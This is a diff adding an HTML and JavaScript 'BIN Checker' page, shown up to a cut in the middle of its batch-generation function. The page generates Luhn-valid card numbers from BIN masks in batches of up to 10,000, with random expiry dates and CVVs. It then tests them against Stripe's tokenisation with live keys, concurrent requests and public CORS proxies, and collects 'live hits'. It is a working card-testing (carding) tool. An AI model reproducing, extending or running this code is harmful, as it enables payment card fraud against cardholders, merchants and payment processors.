@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BIN Checker & Card Validator</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui,-apple-system,sans-serif;background:#0f1117;color:#e0e0e0;min-height:100vh;padding:20px}
+.box{max-width:760px;width:100%;margin:0 auto;background:#1a1d27;border-radius:12px;padding:32px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+h1{text-align:center;font-size:1.8rem;background:linear-gradient(90deg,#00d4ff,#7c5cff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
+.sub{text-align:center;color:#555;font-size:.85rem;margin-bottom:24px}
+.form-group{margin-bottom:14px}
+label{display:block;font-size:.8rem;font-weight:600;margin-bottom:4px;color:#999;text-transform:uppercase;letter-spacing:.5px}
+input,select,textarea{width:100%;padding:10px 12px;background:#0f1117;border:1px solid #2a2d3a;border-radius:8px;color:#e0e0e0;font-size:.95rem;outline:none;transition:border-color .2s;resize:vertical;font-family:inherit}
+input:focus,select:focus,textarea:focus{border-color:#00d4ff}
+.row{display:flex;gap:12px}
+.row .form-group{flex:1;min-width:0}
+.btn{width:100%;padding:12px;background:linear-gradient(135deg,#00d4ff,#7c5cff);border:none;border-radius:8px;color:#fff;font-size:1rem;font-weight:700;cursor:pointer;margin-top:6px;transition:transform .15s,box-shadow .2s}
+.btn:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(0,212,255,.35)}
+.btn:active{transform:translateY(0)}
+.btn-secondary{background:#6c5ce7}
+.btn-tertiary{background:#00b894}
+.btn-danger{background:linear-gradient(135deg,#e17055,#fab1a0)}
+.result{margin-top:24px;display:none}
+.result.show{display:block}
+.card-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;gap:8px;flex-wrap:wrap}
+.card-title{font-size:1.1rem;font-weight:700;display:flex;align-items:center;gap:8px}
+.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:.7rem;font-weight:700;text-transform:uppercase}
+.badge.visa{background:#1a1f71;color:#fff}
+.badge.mastercard{background:#eb001b;color:#fff}
+.badge.amex{background:#006fcf;color:#fff}
+.badge.discover{background:#ff6000;color:#fff}
+.badge.jcb{background:#0e4c96;color:#fff}
+.badge.diners{background:#0079be;color:#fff}
+.badge.unionpay{background:#e21836;color:#fff}
+.badge.elo{background:#000;color:#fff}
+.badge.mir{background:#0f4c81;color:#fff}
+.badge.default{background:#2a2d3a;color:#aaa}
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px}
+.info-item{background:#0f1117;padding:10px 12px;border-radius:8px;border:1px solid #2a2d3a}
+.info-label{font-size:.7rem;color:#555;text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px}
+.info-value{font-size:.9rem;font-weight:600;word-break:break-word}
+.luhn{text-align:center;margin:14px 0;padding:10px;border-radius:8px;font-size:.9rem;font-weight:600}
+.luhn.ok{background:rgba(0,255,100,.1);color:#00ff64;border:1px solid rgba(0,255,100,.25)}
+.luhn.fail{background:rgba(255,60,60,.1);color:#ff3c3c;border:1px solid rgba(255,60,60,.25)}
+.copy-btn{padding:8px 14px;background:#2a2d3a;border:1px solid #3a3d4a;border-radius:6px;color:#aaa;font-size:.75rem;cursor:pointer;white-space:nowrap}
+.copy-btn:hover{background:#3a3d4a;color:#fff}
+.copy-all{margin-top:10px;padding:10px;background:#1a1d27;border:1px solid #2a2d3a;border-radius:8px;width:100%;color:#00d4ff;font-size:.85rem;font-weight:600;cursor:pointer}
+.copy-all:hover{background:#2a2d3a}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #444;border-top-color:#00d4ff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle}
+@keyframes spin{to{transform:rotate(360deg)}}
+.local-note{text-align:center;font-size:.7rem;color:#444;margin-top:14px}
+.proxy-bar{margin-top:10px;padding:10px;background:#14161f;border:1px solid #2a2d3a;border-radius:8px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.proxy-toggle{display:flex;align-items:center;gap:8px;font-size:.75rem;color:#aaa;margin:0;text-transform:none;letter-spacing:0}
+.proxy-toggle input{width:44px;height:24px;background:#2a2d3a;border-radius:12px;appearance:none;-webkit-appearance:none;cursor:pointer;position:relative;flex:0 0 44px;padding:0;border:0}
+.proxy-toggle input:checked{background:#00d4ff}
+.proxy-toggle input::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:transform .2s}
+.proxy-toggle input:checked::after{transform:translateX(20px)}
+.proxy-select{padding:6px 10px;background:#0f1117;border:1px solid #2a2d3a;border-radius:6px;color:#e0e0e0;font-size:.75rem;width:auto}
+.proxy-url{flex:1;min-width:140px;padding:6px 10px;background:#0f1117;border:1px solid #2a2d3a;border-radius:6px;color:#e0e0e0;font-size:.75rem}
+.proxy-status{font-size:.7rem;color:#555}
+.api-test{margin-top:12px;padding:10px;border-radius:8px;background:#0a0a0f;border:1px solid #2a2d3a;font-size:.8rem}
+.api-test.success{border-color:#00ff64;color:#00ff64}
+.api-test.error{border-color:#ff3c3c;color:#ff3c3c}
+.api-test h4{margin-bottom:6px;font-size:.85rem}
+.api-test pre{white-space:pre-wrap;word-break:break-all;font-family:monospace;font-size:.75rem}
+.batch-section{margin-top:20px;padding:16px;background:#14161f;border-radius:10px;border:1px solid #2a2d3a}
+.batch-section h2{font-size:1rem;margin-bottom:12px;color:#00d4ff}
+.hint{font-size:.7rem;color:#555;margin-top:6px;line-height:1.5}
+.hint code{background:#0a0a0f;padding:1px 5px;border-radius:4px;color:#00d4ff}
+.batch-output{width:100%;min-height:160px;margin-top:8px;padding:8px;background:#0a0a0f;border:1px solid #2a2d3a;border-radius:8px;color:#e0e0e0;font-family:monospace;font-size:.75rem;white-space:pre;overflow:auto}
+.batch-stats{font-size:.8rem;color:#888;margin-top:8px}
+.batch-stats span{color:#00d4ff;font-weight:700}
+.presets{display:flex;gap:8px;margin-top:6px;flex-wrap:wrap}
+.preset-btn{padding:4px 8px;background:#2a2d3a;border:1px solid #3a3d4a;border-radius:6px;color:#aaa;font-size:.7rem;cursor:pointer}
+.preset-btn:hover{background:#3a3d4a;color:#fff}
+.log-panel{margin-top:12px;background:#0a0a0f;border:1px solid #2a2d3a;border-radius:8px;padding:10px}
+.log-head{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+.log-title{font-size:.75rem;font-weight:700;color:#00d4ff;text-transform:uppercase;letter-spacing:.5px}
+.log-actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.log-btn{padding:4px 10px;background:#2a2d3a;border:1px solid #3a3d4a;border-radius:6px;color:#aaa;font-size:.7rem;cursor:pointer}
+.log-btn:hover{background:#3a3d4a;color:#fff}
+#liveLog{width:100%;min-height:230px;padding:8px;background:#05050a;border:1px solid #1e2130;border-radius:6px;color:#b8b8c0;font-family:ui-monospace,Consolas,monospace;font-size:.72rem;line-height:1.5;white-space:pre;overflow:auto}
+.err-codes{margin-top:8px;font-size:.72rem;color:#888;line-height:1.9}
+.err-codes b{color:#e17055;font-weight:600;background:#14161f;border:1px solid #2a2d3a;border-radius:20px;padding:2px 8px;margin-right:6px;font-family:monospace}
+.log-hint{font-size:.7rem;color:#555;margin-top:8px;line-height:1.6}
+.log-hint code{background:#0a0a0f;padding:1px 5px;border-radius:4px;color:#00d4ff}
+@keyframes spin{to{transform:rotate(360deg)}}
+.log-panel{margin-top:12px;background:#0a0a0f;border:1px solid #2a2d3a;border-radius:8px;padding:10px}
+.log-head{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+.log-title{font-size:.75rem;font-weight:700;color:#00d4ff;text-transform:uppercase;letter-spacing:.5px}
+.log-actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.log-btn{padding:4px 10px;background:#2a2d3a;border:1px solid #3a3d4a;border-radius:6px;color:#aaa;font-size:.7rem;cursor:pointer}
+.log-btn:hover{background:#3a3d4a;color:#fff}
+#liveLog{width:100%;min-height:230px;padding:8px;background:#05050a;border:1px solid #1e2130;border-radius:6px;color:#b8b8c0;font-family:ui-monospace,Consolas,monospace;font-size:.72rem;line-height:1.5;white-space:pre;overflow:auto}
+.err-codes{margin-top:8px;font-size:.72rem;color:#888;line-height:1.9}
+.err-codes b{color:#e17055;font-weight:600;background:#14161f;border:1px solid #2a2d3a;border-radius:20px;padding:2px 8px;margin-right:6px;font-family:monospace}
+.log-hint{font-size:.7rem;color:#555;margin-top:8px;line-height:1.6}
+.log-hint code{background:#0a0a0f;padding:1px 5px;border-radius:4px;color:#00d4ff}
+@media(max-width:560px){
+  .info-grid{grid-template-columns:1fr}
+  .row{flex-direction:column;gap:0}
+  .box{padding:20px}
+}
+</style>
+</head>
+<body>
+<div class="box">
+<h1>BIN Checker</h1>
+<p class="sub">Card validation + BIN lookup + live test + batch generator</p>
+
+<!-- CARD INPUT -->
+<div class="form-group">
+<label>Card Number / BIN Mask</label>
+<input id="ccNum" type="text" placeholder="5387233000xxxxxx" maxlength="23" autocomplete="cc-number" oninput="onInput(this.value)">
+<div class="hint">Digits + <code>x</code> placeholders. Everything after the first <code>x</code> gets filled with random digits.</div>
+<button class="btn btn-secondary" onclick="genCard()">Gen Valid Card</button>
+</div>
+<div class="row">
+<div class="form-group">
+<label>Expiry (MM/YY)</label>
+<input id="ccExp" type="text" placeholder="12/28" maxlength="5" autocomplete="cc-exp" oninput="this.value = formatExp(this.value)">
+</div>
+<div class="form-group">
+<label>CVV</label>
+<input id="ccCvc" type="text" placeholder="123" maxlength="4" autocomplete="cc-csc">
+</div>
+</div>
+<div class="form-group">
+<label>Cardholder Name</label>
+<input id="ccName" type="text" placeholder="JOHN DOE" autocomplete="cc-name">
+</div>
+
+<!-- BILLING -->
+<div class="form-group">
+<label>Billing Address</label>
+<input id="ccAddr" type="text" placeholder="123 Main St, Apt 4" autocomplete="street-address">
+</div>
+<div class="row">
+<div class="form-group">
+<label>City</label>
+<input id="ccCity" type="text" placeholder="New York" autocomplete="address-level2">
+</div>
+<div class="form-group">
+<label>State / Province</label>
+<input id="ccState" type="text" placeholder="NY" autocomplete="address-level1">
+</div>
+</div>
+<div class="row">
+<div class="form-group">
+<label>ZIP / Postal Code</label>
+<input id="ccZip" type="text" placeholder="10001" autocomplete="postal-code">
+</div>
+<div class="form-group">
+<label>Billing Country</label>
+<input id="ccCountry" type="text" placeholder="US" autocomplete="country">
+</div>
+</div>
+
+<!-- BATCH MODEL INPUT -->
+<div class="batch-section">
+<h2>Batch Template Model</h2>
+<div class="form-group">
+<label>BIN / Date / Country (paste your model)</label>
+<textarea id="templateInput" rows="4" placeholder="BIN: 5387233000xxxxxx&#10;Date: 11/27&#10;Country: 🇨🇦 | A.K.A Canada"></textarea>
+<div class="hint">Parse pulls the mask, date and country out of this box into the fields below.</div>
+</div>
+<div class="row">
+<div class="form-group">
+<button class="btn btn-secondary" onclick="parseTemplate()" style="margin-top:0">Parse Template</button>
+</div>
+<div class="form-group">
+<button class="btn btn-secondary" onclick="fillFromInputs()" style="margin-top:0">Fill from Inputs</button>
+</div>
+</div>
+<div class="row">
+<div class="form-group">
+<label>Date (MM/YY or MM/YYYY)</label>
+<input id="ccDate" type="text" placeholder="11/27" oninput="this.value = formatDate(this.value)">
+<label class="proxy-toggle" style="margin-top:8px"><input type="checkbox" id="randomDate"> <span>Random date per card</span></label>
+</div>
+<div class="form-group">
+<label>Country (ISO 2)</label>
+<input id="ccCountryISO" type="text" placeholder="CA" maxlength="2" style="text-transform:uppercase">
+</div>
+</div>
+<div class="presets">
+<button class="preset-btn" onclick="setPreset('CA')">CA</button>
+<button class="preset-btn" onclick="setPreset('US')">US</button>
+<button class="preset-btn" onclick="setPreset('GB')">GB</button>
+<button class="preset-btn" onclick="setPreset('DE')">DE</button>
+<button class="preset-btn" onclick="setPreset('FR')">FR</button>
+<button class="preset-btn" onclick="setPreset('BR')">BR</button>
+<button class="preset-btn" onclick="setPreset('IN')">IN</button>
+<button class="preset-btn" onclick="setPreset('JP')">JP</button>
+</div>
+</div>
+
+<!-- BATCH CONTROLS -->
+<div class="batch-section">
+<h2>Batch Generation</h2>
+<div class="row">
+<div class="form-group">
+<label>Batch Count</label>
+<input id="batchCount" type="number" value="100" min="1" max="10000">
+</div>
+<div class="form-group">
+<label>Concurrency</label>
+<input id="batchConcurrency" type="number" value="5" min="1" max="20">
+</div>
+</div>
+<button class="btn btn-danger" onclick="genBatch()" id="genBatchBtn">Generate Batch</button>
+<div id="batchResult" style="margin-top:16px;display:none">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:8px;flex-wrap:wrap">
+<span id="batchStats" class="batch-stats"></span>
+<button class="copy-all" onclick="copyBatchValid()" style="padding:6px 12px;font-size:.7rem;width:auto;margin-left:auto">Copy All</button>
+</div>
+<textarea id="batchOutput" class="batch-output" readonly spellcheck="false"></textarea>
+</div>
+
+<div class="row" style="margin-top:14px">
+<div class="form-group">
+<label>Test mode</label>
+<select id="testMode">
+<option value="stripe">Stripe token (needs pk_ key)</option>
+<option value="bin">Local BIN lookup (no key)</option>
+</select>
+</div>
+<div class="form-group">
+<label>&nbsp;</label>
+<button class="btn btn-tertiary" onclick="testBatch()" id="testBatchBtn" style="margin-top:0">Test Generated</button>
+</div>
+</div>
+
+<div id="liveBox" style="margin-top:14px;display:none">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:8px;flex-wrap:wrap">
+<span id="liveStats" class="batch-stats"></span>
+<button class="copy-all" onclick="copyLiveValid()" style="padding:6px 12px;font-size:.7rem;width:auto;margin-left:auto">Copy Hits</button>
+</div>
+<textarea id="liveResult" class="batch-output" style="min-height:240px" readonly spellcheck="false" placeholder="Live hits land here, in order…"></textarea>
+</div>
+
+<!-- LIVE LOG PANEL -->
+<div class="log-panel" id="logPanel" style="display:none">
+<div class="log-head">
+<span class="log-title">Live Log</span>
+<div class="log-actions">
+<button class="log-btn" onclick="clearLog()">Clear</button>
+<button class="log-btn" onclick="toggleLog()">Hide</button>
+</div>
+</div>
+<div id="liveLog" readonly spellcheck="false"></div>
+<div class="log-hint">Every request and response is logged here. <code>402</code> = card declined by Stripe. <code>401</code> = bad key. <code>429</code> = rate limited.</div>
+</div>
+
+<button class="btn btn-tertiary" id="logToggleBtn" onclick="toggleLog()" style="margin-top:8px;width:auto;padding:6px 14px;font-size:.75rem">Show Live Log</button>
+</div>
+
+<!-- STRIPE TEST -->
+<div class="form-group">
+<label>Stripe Publishable Key (optional)</label>
+<input id="stripeKey" type="password" placeholder="pk_live_... or pk_test_..." autocomplete="off">
+<button class="btn btn-secondary" onclick="showStripeHelp()" style="margin-top:6px;width:100%">? How to get a Stripe key</button>
+<div id="stripeHelp" style="display:none;margin-top:10px;padding:12px;background:#0a0a0f;border:1px solid #2a2d3a;border-radius:8px;font-size:.8rem;line-height:1.6">
+<p style="margin-bottom:8px"><strong style="color:#00d4ff">Steps to get your key:</strong></p>
+<ol style="padding-left:16px;color:#aaa;margin-bottom:10px">
+<li>Go to <a href="https://stripe.com" target="_blank" style="color:#00d4ff">stripe.com</a> and sign up for a free account</li>
+<li>Log into the Dashboard at <a href="https://dashboard.stripe.com" target="_blank" style="color:#00d4ff">dashboard.stripe.com</a></li>
+<li>Click <strong>Developers</strong> → <strong>API Keys</strong> (or go to Dashboard → Settings → API Keys)</li>
+<li>You'll see <strong>Publishable key</strong> — click <strong>Copy</strong></li>
+</ol>
+<div style="padding:8px;background:#0f1117;border:1px dashed #2a2d3a;border-radius:6px;margin-bottom:8px">
+<p style="margin:0 0 4px"><span style="color:#00d4ff">Test mode (safe):</span> Starts with <code style="color:#00d4ff">pk_test_</code> — no real charges, use for testing</p>
+<p style="margin:0"><span style="color:#e17055">Live mode:</span> Starts with <code style="color:#e17055">pk_live_</code> — real charges, be careful</p>
+</div>
+<p style="margin:0;font-size:.7rem;color:#555">Free to sign up. No card required for test mode. The key is public and safe to use in browser-side apps.</p>
+</div>
+</div>
+<button class="btn btn-tertiary" onclick="testStripe()" id="stripeBtn">Test on Stripe</button>
+
+<div class="proxy-bar">
+<label class="proxy-toggle"><input type="checkbox" id="proxyToggle"> <span>Proxy for API</span></label>
+<select id="proxyPreset" class="proxy-select" onchange="syncProxy()">
+<option value="https://corsproxy.io/?url=">corsproxy.io</option>
+<option value="https://api.allorigins.win/raw?url=">allorigins.win</option>
+<option value="https://cors-anywhere.herokuapp.com/">cors-anywhere (manual)</option>
+<option value="">custom</option>
+</select>
+<input id="proxyUrl" class="proxy-url" type="text" placeholder="https://corsproxy.io/?url=">
+<button class="btn btn-tertiary" onclick="testProxy()" style="width:auto;padding:6px 14px;font-size:.75rem">Test Proxy</button>
+<span id="proxyStatus" class="proxy-status"></span>
+</div>
+
+<button class="btn" onclick="doCheck()">Check Card</button>
+
+<div id="result" class="result"></div>
+<button class="copy-all" onclick="copyAll()" id="copyAllBtn" style="display:none">Copy All Details</button>
+<p class="local-note">Local dataset + binlist.net API + Stripe token test - everything stays in the browser.</p>
+</div>
+
+<script>
+"use strict";
+
+/* ============ LUHN ============ */
+function luhnCheck(num){
+  var s=0,alt=false;
+  for(var i=num.length-1;i>=0;i--){
+    var n=parseInt(num.charAt(i),10);
+    if(isNaN(n))return false;
+    if(alt){n*=2;if(n>9)n-=9;}
+    s+=n;alt=!alt;
+  }
+  return s%10===0;
+}
+
+function luhnCheckDigit(partial){
+  var s=0,alt=true;
+  for(var i=partial.length-1;i>=0;i--){
+    var n=parseInt(partial.charAt(i),10);
+    if(isNaN(n))return 0;
+    if(alt){n*=2;if(n>9)n-=9;}
+    s+=n;alt=!alt;
+  }
+  return (10-(s%10))%10;
+}
+
+/* ============ BRAND ============ */
+function detectBrand(bin){
+  var b=String(bin).replace(/\D/g,'');
+  if(/^4/.test(b))return{name:'Visa',short:'visa'};
+  if(/^5[1-5]/.test(b)||/^2[2-7]/.test(b))return{name:'Mastercard',short:'mastercard'};
+  if(/^3[47]/.test(b))return{name:'American Express',short:'amex'};
+  if(/^6(?:011|5)/.test(b))return{name:'Discover',short:'discover'};
+  if(/^35/.test(b))return{name:'JCB',short:'jcb'};
+  if(/^3(?:0[0-5]|[68])/.test(b))return{name:'Diners Club',short:'diners'};
+  if(/^62/.test(b))return{name:'UnionPay',short:'unionpay'};
+  if(/^220[0-4]/.test(b))return{name:'Mir',short:'mir'};
+  return{name:'Unknown',short:'default'};
+}
+
+/* ============ LOCAL BIN DATASET ============ */
+var BIN_DB={
+  '411111':{bank:'JPMorgan Chase',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '400005':{bank:'Citibank',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '426684':{bank:'Capital One',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '430945':{bank:'Chase',country:'US',countryName:'United States',currency:'USD',type:'Debit',prepaid:false},
+  '444444':{bank:'Wells Fargo',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '453201':{bank:'Bank of America',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '510510':{bank:'Mastercard',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '378282':{bank:'American Express',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '371449':{bank:'American Express',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '601111':{bank:'Discover',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '601100':{bank:'Discover',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '353011':{bank:'JCB',country:'JP',countryName:'Japan',currency:'JPY',type:'Credit',prepaid:false},
+  '356600':{bank:'JCB',country:'JP',countryName:'Japan',currency:'JPY',type:'Credit',prepaid:false},
+  '305693':{bank:'Diners Club',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '38520000':{bank:'Diners Club',country:'US',countryName:'United States',currency:'USD',type:'Credit',prepaid:false},
+  '6221260':{bank:'China UnionPay',country:'CN',countryName:'China',currency:'CNY',type:'Credit',prepaid:false},
+  '457173':{bank:'Jyske Bank',country:'DK',countryName:'Denmark',currency:'DKK',type:'Debit',prepaid:false},
+  '45717360':{bank:'Jyske Bank',country:'DK',countryName:'Denmark',currency:'DKK',type:'Debit',prepaid:false},
+  '516874':{bank:'Visa',country:'GB',countryName:'United Kingdom',currency:'GBP',type:'Debit',prepaid:false},
+  '539983':{bank:'Barclays',country:'GB',countryName:'United Kingdom',currency:'GBP',type:'Credit',prepaid:false},
+  '540668':{bank:'Barclays',country:'GB',countryName:'United Kingdom',currency:'GBP',type:'Debit',prepaid:false},
+  '475000':{bank:'Visa',country:'GB',countryName:'United Kingdom',currency:'GBP',type:'Credit',prepaid:false},
+  '402400':{bank:'Visa',country:'DE',countryName:'Germany',currency:'EUR',type:'Credit',prepaid:false},
+  '520082':{bank:'Visa',country:'DE',countryName:'Germany',currency:'EUR',type:'Debit',prepaid:false},
+  '670359':{bank:'Visa',country:'FR',countryName:'France',currency:'EUR',type:'Credit',prepaid:false},
+  '497980':{bank:'Visa',country:'FR',countryName:'France',currency:'EUR',type:'Credit',prepaid:false},
+  '537136':{bank:'Mastercard',country:'CA',countryName:'Canada',currency:'CAD',type:'Credit',prepaid:false},
+  '552094':{bank:'Mastercard',country:'CA',countryName:'Canada',currency:'CAD',type:'Debit',prepaid:false},
+  '527054':{bank:'Mastercard',country:'AU',countryName:'Australia',currency:'AUD',type:'Credit',prepaid:false},
+  '450875':{bank:'Visa',country:'AU',countryName:'Australia',currency:'AUD',type:'Debit',prepaid:false},
+  '606211':{bank:'RuPay',country:'IN',countryName:'India',currency:'INR',type:'Credit',prepaid:false},
+  '508500':{bank:'RuPay',country:'IN',countryName:'India',currency:'INR',type:'Debit',prepaid:false},
+  '504175':{bank:'Elo',country:'BR',countryName:'Brazil',currency:'BRL',type:'Credit',prepaid:false},
+  '636368':{bank:'Elo',country:'BR',countryName:'Brazil',currency:'BRL',type:'Debit',prepaid:false},
+  '438935':{bank:'Visa',country:'BR',countryName:'Brazil',currency:'BRL',type:'Credit',prepaid:false},
+  '401178':{bank:'Visa',country:'BR',countryName:'Brazil',currency:'BRL',type:'Credit',prepaid:false}
+};
+
+function localLookup(bin){
+  bin=String(bin).replace(/\D/g,'');
+  for(var len=6;len<=8;len++){
+    var key=bin.slice(0,len);
+    if(key.length===len&&BIN_DB[key])return BIN_DB[key];
+  }
+  return null;
+}
+
+/* ============ FORMAT HELPERS ============ */
+function formatCardNumber(val){
+  var clean=String(val).replace(/[^0-9xX]/g,'').toLowerCase().slice(0,19);
+  var out='';
+  for(var i=0;i<clean.length;i++){
+    if(i>0&&i%4===0)out+=' ';
+    out+=clean.charAt(i);
+  }
+  return out;
+}
+
+function formatExp(val){
+  val=String(val).replace(/\D/g,'').slice(0,4);
+  if(val.length>=3)val=val.slice(0,2)+'/'+val.slice(2);
+  return val;
+}
+
+function formatDate(val){
+  val=String(val).replace(/[^0-9]/g,'');
+  if(val.length<=2)return val;
+  return val.slice(0,2)+'/'+val.slice(2,4);
+}
+
+/* ============ MASK ENGINE ============ */
+function normalizeMask(val){
+  return String(val).replace(/[^0-9xX]/g,'').toLowerCase();
+}
+
+function numberFromMask(mask){
+  var m=normalizeMask(mask);
+  if(m.length<12)return null;
+  var chars=m.split('');
+  for(var i=0;i<chars.length;i++){
+    if(chars[i]==='x')chars[i]=String(Math.floor(Math.random()*10));
+  }
+  var body=chars.slice(0,chars.length-1).join('');
+  chars[chars.length-1]=String(luhnCheckDigit(body));
+  var out=chars.join('');
+  return luhnCheck(out)?out:null;
+}
+
+function cvvFor(number){
+  return detectBrand(number).short==='amex'
+    ? String(Math.floor(Math.random()*9000)+1000)
+    : String(Math.floor(Math.random()*900)+100);
+}
+
+function randomExp(){
+  var mm=Math.floor(Math.random()*12)+1;
+  var yy=Math.floor(Math.random()*8)+26;
+  return (mm<10?'0':'')+mm+'/'+yy;
+}
+
+/* ============ LIVE API ============ */
+function proxyTarget(targetUrl){
+  var enabled=document.getElementById('proxyToggle').checked;
+  if(!enabled)return targetUrl;
+  var preset=document.getElementById('proxyPreset').value;
+  var custom=document.getElementById('proxyUrl').value.trim();
+  if(preset==='https://corsproxy.io/?url=')return preset+encodeURIComponent(targetUrl);
+  if(preset==='https://api.allorigins.win/raw?url=')return preset+encodeURIComponent(targetUrl);
+  if(preset==='https://cors-anywhere.herokuapp.com/')return preset+targetUrl;
+  if(custom)return custom+targetUrl;
+  return targetUrl;
+}
+
+async function apiLookup(bin){
+  bin=String(bin).replace(/\D/g,'');
+  var url=proxyTarget('https://lookup.binlist.net/'+bin.slice(0,8));
+  try{
+    var r=await fetch(url,{headers:{'Accept-Version':'3'}});
+    if(!r.ok)return null;
+    var d=await r.json();
+    if(!d||!d.scheme)return null;
+    return{
+      bank:d.bank?d.bank.name:'N/A',
+      country:d.country?d.country.alpha2:'N/A',
+      countryName:d.country?d.country.name:'N/A',
+      currency:d.country?d.country.currency:'N/A',
+      type:d.type||'N/A',
+      prepaid:!!d.prepaid,
+      scheme:d.scheme||'N/A',
+      brand:d.brand||'N/A'
+    };
+  }catch(e){return null;}
+}
+
+async function testProxy(){
+  var statusEl=document.getElementById('proxyStatus');
+  if(!document.getElementById('proxyToggle').checked){
+    statusEl.textContent='enable proxy first';
+    return;
+  }
+  var url=proxyTarget('https://lookup.binlist.net/45717360');
+  statusEl.textContent='testing…';
+  try{
+    var r=await fetch(url,{headers:{'Accept-Version':'3'}});
+    if(!r.ok){statusEl.textContent='proxy failed ('+r.status+')';return;}
+    var d=await r.json();
+    if(!d||!d.scheme){statusEl.textContent='proxy returned no data';return;}
+    statusEl.textContent='proxy OK - bank: '+(d.bank&&d.bank.name?d.bank.name:'N/A');
+  }catch(e){
+    statusEl.textContent='proxy error: '+e.message;
+  }
+}
+
+/* ============ SINGLE CARD GEN ============ */
+function genCard(){
+  var mask=document.getElementById('ccNum').value;
+  if(!normalizeMask(mask).includes('x')){
+    mask='424242424242xxxx';
+  }
+  var num=numberFromMask(mask);
+  if(!num){alert('Mask needs at least 12 characters');return;}
+  document.getElementById('ccNum').value=formatCardNumber(num);
+  document.getElementById('ccExp').value='12/30';
+  document.getElementById('ccCvc').value=cvvFor(num);
+  document.getElementById('ccName').value=document.getElementById('ccName').value||'JOHN DOE';
+  doCheck();
+}
+
+/* ============ TEMPLATE PARSE / FILL ============ */
+function parseTemplate(){
+  var t=document.getElementById('templateInput').value.trim();
+  if(!t){alert('Paste a template first');return;}
+
+  var binMatch=t.match(/BIN\s*[:=]\s*([0-9xX]+)/i);
+  if(binMatch){
+    document.getElementById('ccNum').value=formatCardNumber(binMatch[1]);
+  }
+
+  var dateMatch=t.match(/Date\s*[:=]\s*(\d{1,2})\s*\/\s*(\d{2,4})/i);
+  if(dateMatch){
+    var mm=dateMatch[1].length===1?'0'+dateMatch[1]:dateMatch[1];
+    document.getElementById('ccDate').value=mm+'/'+dateMatch[2];
+  }
+
+  var iso='';
+  var flagMap={'🇨🇦':'CA','🇺🇸':'US','🇬🇧':'GB','🇩🇪':'DE','🇫🇷':'FR','🇧🇷':'BR','🇮🇳':'IN','🇯🇵':'JP','🇦🇺':'AU','🇳🇱':'NL','🇪🇸':'ES','🇮🇹':'IT','🇹🇷':'TR'};
+  for(var f in flagMap){
+    if(t.indexOf(f)!==-1){iso=flagMap[f];break;}
+  }
+  if(!iso){
+    var cMatch=t.match(/Country\s*[:=]\s*([A-Za-z]{2})\b/i);
+    if(cMatch)iso=cMatch[1].toUpperCase();
+  }
+  if(iso){
+    document.getElementById('ccCountryISO').value=iso;
+    document.getElementById('ccCountry').value=iso;
+  }
+
+  flash(document.getElementById('genBatchBtn'),'Template parsed');
+}
+
+function fillFromInputs(){
+  var mask=normalizeMask(document.getElementById('ccNum').value)||'411111xxxxxxxxxx';
+  if(!mask.includes('x')){
+    var digits=mask.replace(/\D/g,'');
+    var pad=Math.max(16-digits.length,0);
+    mask=digits+Array(pad+1).join('x');
+  }
+  var date=document.getElementById('ccDate').value||'11/27';
+  var iso=document.getElementById('ccCountryISO').value||'CA';
+  var flagMap={CA:'🇨🇦',US:'🇺🇸',GB:'🇬🇧',DE:'🇩🇪',FR:'🇫🇷',BR:'🇧🇷',IN:'🇮🇳',JP:'🇯🇵',AU:'🇦🇺',NL:'🇳🇱',ES:'🇪🇸',IT:'🇮🇹',TR:'🇹🇷'};
+  var text='BIN: '+mask+'\nDate: '+date+'\nCountry: '+(flagMap[iso]||'')+' | '+iso;
+  document.getElementById('templateInput').value=text;
+  flash(document.getElementById('genBatchBtn'),'Filled from inputs');
+}
+
+function setPreset(iso){
+  document.getElementById('ccCountryISO').value=iso;
+  document.getElementById('ccCountry').value=iso;
+}
+
+function flash(btn,msg){
+  if(!btn)return;
+  if(!btn.dataset.orig)btn.dataset.orig=btn.textContent;
+  btn.textContent=msg;
+  setTimeout(function(){btn.textContent=btn.dataset.orig;},1400);
+}
+
+/* ============ BATCH GENERATION ============ */
+function genBatch(){
+  var count=parseInt(document.getElementById('batchCount').value,10)||100;
+  if(count<1)count=1;
+  if(count>10000)count=10000;
+
+  var mask=normalizeMask(document.getElementById('ccNum').value);
+  if(!mask){
+    var tpl=document.getElementById('templateInput').value.match(/BIN\s*[:=]\s*([0-9xX]+)/i);
+    if(tpl)mask=normalizeMask(tpl[1]);
+  }
+  if(!mask)mask='411111xxxxxxxxxx';
+  if(mask.length<12){
